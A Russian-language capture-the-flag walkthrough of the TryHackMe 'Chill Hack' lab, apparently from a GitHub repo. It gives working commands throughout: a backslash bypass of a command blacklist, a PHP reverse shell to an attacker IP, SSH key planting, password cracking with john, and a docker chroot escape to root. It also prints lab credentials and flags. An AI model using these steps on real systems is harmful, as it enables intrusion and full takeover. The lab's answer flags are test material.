[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Chill Hack](https://tryhackme.com/r/room/chillhack) 

Всего 1 заданиe:
## Задание 1
Охладите хак машины.

Легкий уровень CTF. Захватывайте флаги и получайте удовольствие!
Вы начинаете с поиска уязвимости инъекции команд на веб-сервере и эксплуатируете уязвимость, чтобы получить оболочку 
на коробке. Затем вам нужно эксплуатировать скрипт bash и повысить свои привилегии до пользователя с именем apaar, а 
затем вы можете сбросить ключ SSH, а затем воспользоваться SSH для переадресации портов на порт, работающий на 
локальном хосте. Веб-сайт, на котором вы сделали переадресацию портов, уязвим для инъекции SQL, и вы можете 
использовать это, чтобы обойти аутентификацию, а затем получить доступ к аутентифицированному контенту. После входа 
в систему вы найдете подсказку, которая заставляет вас подозревать стенографию. Скопируйте изображение на свой ящик, 
выполните анализ стего и получите резервный zip-файл. zip-файл зашифрован с помощью пароля. Вы генерируете хэш с 
помощью zip2john и кряка с john the ripper и получаете пароль для zip-файла. Извлеките zip-файл и вы найдете 
исходный код PHP, который содержит некоторые учетные данные для другого пользователя. Повысьте свои привилегии до 
этого пользователя и обнаружите, что он в группе docker, сделайте немного магии GTFOBins и получите root shell на 
коробке, это действительно забавная коробка без особых слов, давайте перейдем к делу
### Ответьте на вопросы ниже
Пользовательский флаг
```commandline
nmap -sC -sV 10.10.51.62
ftp 10.10.51.62
# anonymous
ls -la
get note.txt -
cat note.txt
# Anurodh and Apaar
```
Возвращаясь к моему сканированию Gobuster, я обнаружил несколько каталогов, и один из них был интересным `http://10.10.51.62/secret/`.
Я решил заглянуть в каталог и обнаружил, что там есть файл index.php, который может выполнять команды.
```commandline
gobuster dir -u http://10.10.51.62 -x txt,php,tar,zip -w /usr/share/wordlists/dirb/common.txt
# http://10.10.51.62/secret/
```
Я решил начать с простого и просто выполнить `ls`, чтобы получить список каталогов. Но когда я выполнил команду, я 
получил сообщение об ошибке. Я подумал, что это может быть страница троллей, не имеющая реальной функции, но чтобы 
подтвердить свои подозрения, я попробовал другую команду `whoami`, затем `ifconfig`. И команды выполнились просто 
отлично. Потом я предположил, что в команде была фильтрация по некоторым словам. Самый простой способ, которым я всегда пытаюсь обойти 
любую фильтрацию при инъекции команды, — это использовать обратные косые черты. Если я не экранирую специальные 
символы, то слово будет интерпретироваться bash одинаково. Итак, я попробовал снова выполнить ls, но в этом случае 
я добавил обратную связь между l и s. Далее я решил взглянуть на PHP-файл, в котором выполняются команды, и 
посмотреть, какие еще слова были занесены в черный список скриптом с помощью приведенной ниже команды. 
```commandline
ls
ifconfig
l\s -la
c\at index.php
```
И глядя на источник, мы видим еще несколько слов, которые фильтруются скриптом, включая
```commandline
nc, python, bash, php, perl, rm, cat, head, tail, python3, more, less, sh, ls
```
Эти слова в основном используются для получения обратных оболочек на любой системе. Но теперь у нас есть способ 
обойти эти ограничения. Теперь давайте получим оболочку. 
Я создал обратную оболочку bash
```commandline
whoami;php -r '$sock=fsockopen("your-vpn-ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
на вашей машине запускаем прослушивание порта 4444, а затем bash
```commandline
nc -lvnp 4444
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
cat /home/apaar/.helpline.sh
sudo -u apaar ./.helpline.sh
cat local.txt
```
```commandline
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```
Корневой флаг
```commandline
id
ssh-keygen
echo "your-ssh-public-key-contents" >> /home/apaar/.ssh/authorized_keys
ssh -L 9001:127.0.0.1:9001 apaar@10.10.51.62 -i id_rsa
# http://127.0.0.1:9001

cd /var/www/files/
cat account.php
cat index.php
# mysl:dbname=webportal;host=localhost, root, !@m_her00+@db

mysql -u root -p

SHOW DATABASES;
USE webportal
SHOW TABLES;
SELECT * FROM users;
```
Глядя на файл hackers.php мы получаем подсказку и картинку, первая мысль, которая пришла в голову, была стенография. 
Я загрузил изображение на свой локальный ящик с помощью wget. Далее я попробовал простые методы стенографии.

```commandline
cat hacker.php
wget http://127.0.0.1:9001/images/hacker-with-laptop_23-2147985341.jpg
file hacker-with-laptop_23-2147985341.jpg 
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
# pass1word        (backup.zip/source_code.php)
unzip backup.zip
# pass1word
cat source_code.php
echo -n IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d ; echo

# Username: anurodh
# Password: !d0ntKn0wmYp@ssw0rd
```

```commandline
su - anorodh



docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id
cd /root
ls -la
cat proof.txt
```
```commandline
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)